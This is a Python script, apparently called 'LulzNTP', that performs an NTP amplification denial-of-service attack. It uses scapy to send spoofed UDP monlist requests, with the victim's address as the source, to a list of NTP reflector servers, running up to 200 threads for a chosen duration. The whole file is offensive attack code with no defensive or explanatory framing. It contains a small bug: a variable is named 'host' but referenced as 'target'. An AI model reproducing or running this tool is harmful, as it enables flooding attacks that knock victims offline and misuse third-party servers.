import threading, sys, os, time
from random import randint
from scapy.all import *

data = "\x17\x00\x03\x2a" + "\x00" * 4

ntp_amps = []
with open('ntp.txt', 'r') as ntp_file:
    [ntp_amps.append(ntp_server.strip('\n')) for ntp_server in ntp_file.readlines()]

def flood():
    host = sys.argv[2]
    duration = sys.argv[3]

    stoptime = time.time() + int(duration)
    while time.time() < stoptime:
        try:

            ip = IP(dst=choice(ntp_amps),src=target)
            udp = UDP(sport=48947,dport=123)
            raw = Raw(load=data) 

            send(ip/udp/raw, verbose=0)
        except KeyboardInterrupt:
            os.kill(os.getpid(), 9)
        except Exception:
            pass
        
if __name__ == '__main__':
    print('''
             /$$                 /$$           /$$   /$$ /$$$$$$$$ /$$$$$$$ 
            | $$                | $$          | $$$ | $$|__  $$__/| $$__  $$
            | $$       /$$   /$$| $$ /$$$$$$$$| $$$$| $$   | $$   | $$  \ $$
            | $$      | $$  | $$| $$|____ /$$/| $$ $$ $$   | $$   | $$$$$$$/
            | $$      | $$  | $$| $$   /$$$$/ | $$  $$$$   | $$   | $$____/ 
            | $$      | $$  | $$| $$  /$$__/  | $$\  $$$   | $$   | $$      
            | $$$$$$$$|  $$$$$$/| $$ /$$$$$$$$| $$ \  $$   | $$   | $$      
            |________/ \______/ |__/|________/|__/  \__/   |__/   |__/      
    ''')

    try:
        threadcount = 200 if int(sys.argv[1]) > 200 else int(sys.argv[1])

        for _ in range(threadcount):
            threading.Thread(target=flood).start()
    except:
        print('error')